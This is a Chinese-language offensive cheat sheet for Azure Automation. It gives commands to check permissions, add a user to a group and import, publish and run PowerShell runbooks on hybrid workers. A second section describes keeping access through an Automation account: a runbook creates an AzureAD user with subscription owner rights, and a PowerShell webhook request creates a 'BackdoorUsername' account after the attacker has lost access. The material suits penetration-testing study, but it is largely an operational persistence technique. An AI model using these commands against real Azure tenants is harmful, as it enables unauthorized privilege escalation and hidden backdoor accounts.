  #### 创建Runbook
	检查自动化用户权限
	az extension add --upgrade -n automation
	az automation account list # if it doesn't return anything the user is not a part of an Automation group
	az ad signed-in-user list-owned-objects

	如果用户不属于“自动化”组
	将他添加到自定义组，例如：“自动化管理员”
	Add-AzureADGroupMember -ObjectId <OBJID> -RefObjectId <REFOBJID> -Verbose

	获取自动化账户上用户的角色
	Contributor 或更高级别 = 可以创建和执行 Runbook
	Get-AzRoleAssignment -Scope /subscriptions/<ID>/resourceGroups/<RG-NAME>/providers/Microsoft.Automation/automationAccounts/<AUTOMATION-ACCOUNT>

	列出混合工作人员
	Get-AzAutomationHybridWorkerGroup -AutomationAccountName <AUTOMATION-ACCOUNT> -ResourceGroupName <RG-NAME>

	创建一个Powershell Runbook
	PS C:\Tools> Import-AzAutomationRunbook -Name <RUNBOOK-NAME> -Path C:\Tools\username.ps1 -AutomationAccountName <AUTOMATION-ACCOUNT> -ResourceGroupName <RG-NAME> -Type PowerShell -Force -Verbose

	发布Runbook
	Publish-AzAutomationRunbook -RunbookName <RUNBOOK-NAME> -AutomationAccountName <AUTOMATION-ACCOUNT> -ResourceGroupName <RG-NAME> -Verbose

	启动Runbook
	Start-AzAutomationRunbook -RunbookName <RUNBOOK-NAME> -RunOn Workergroup1 -AutomationAccountName <AUTOMATION-ACCOUNT> -ResourceGroupName <RG-NAME> -Verbose
  #### 通过自动化帐户持久化
	创建一个新的自动化帐户
	“创建 Azure 运行方式帐户”：是
	导入一个新的 Runbook，创建一个拥有订阅所有者权限的 AzureAD 用户*
	此博客的示例运行手册位于此处 – https://github.com/NetSPI/MicroBurst
	发布运行手册
	将 Webhook 添加到 Runbook
	将 AzureAD 模块添加到自动化帐户
	更新 Azure 自动化模块
	为自动化帐户分配“用户管理员”和“订阅所有者”权限
	最终失去访问权限……
	使用 post 请求触发 webhook 以创建新用户
	$uri = "https://s15events.azure-automation.net/webhooks?token=h6[REDACTED]%3d"
	$AccountInfo  = @(@{RequestBody=@{Username="BackdoorUsername";Password="BackdoorPassword"}})
	$body = ConvertTo-Json -InputObject $AccountInfo
	$response = Invoke-WebRequest -Method Post -Uri $uri -Body $body
